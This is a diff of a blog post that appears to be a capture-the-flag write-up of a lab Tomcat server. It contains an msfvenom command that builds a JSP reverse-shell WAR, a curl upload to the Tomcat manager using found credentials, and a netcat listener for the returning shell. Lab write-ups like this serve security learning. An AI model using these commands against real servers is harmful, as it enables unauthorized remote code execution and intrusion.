@@ -29,11 +29,12 @@ Oct. 23, 2020
 <p>We need to create a payload, for that we&rsquo;ll use <code>msfvenom</code> and to create a virtual host will use the commandline with the credentials we found earlier.</p>
 <p>Let&rsquo;s create our payload first, we need to create a payload of WAR type:</p>
 <blockquote>
-<p>From Wikipedia: In software engineering, a WAR file (Web Application Resource[1] or Web application ARchive[2]) is a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages (HTML and related files) and other resources that together constitute a web application.</p></blockquote>
+<p>From Wikipedia: In software engineering, a WAR file (Web Application Resource[1] or Web application ARchive[2]) is a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages (HTML and related files) and other resources that together constitute a web application.</p>
+</blockquote>
 <p>to create our payload we use msfvenom as follows:</p>
 <p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[YOUR_IP] LPORT=[DESIRED_PORT] -f war &gt; payload.war</code></p>
 <p>Once we have our payload generated, we need to upload it to the server as a new virtual host. We can do that as follows using <code>curl</code>:</p>
-<p><code>curl -u 'tomcat':'$3cureP4s5w0rd123!' -T payload.war 'http://10.10.10.194:8080/manager/text/deploy?path=/tzero86' </code>
+<p><code>curl -u 'tomcat':'$3cureP4s5w0rd123!' -T payload.war 'http://10.10.10.194:8080/manager/text/deploy?path=/tzero86' </code>
 With this command we are creating a new accessible location, in my case <code>/tzero86</code>.</p>
 <p><img src="https://i.imgur.com/3Dc0aui.png" alt=""></p>
 <p>Ok so before we try to connect to this payload we sent to the server, let&rsquo;s fire up a netcat listener on the port you specified when creating the payload, in my case <code>nc -lnvp 2112</code>.</p>
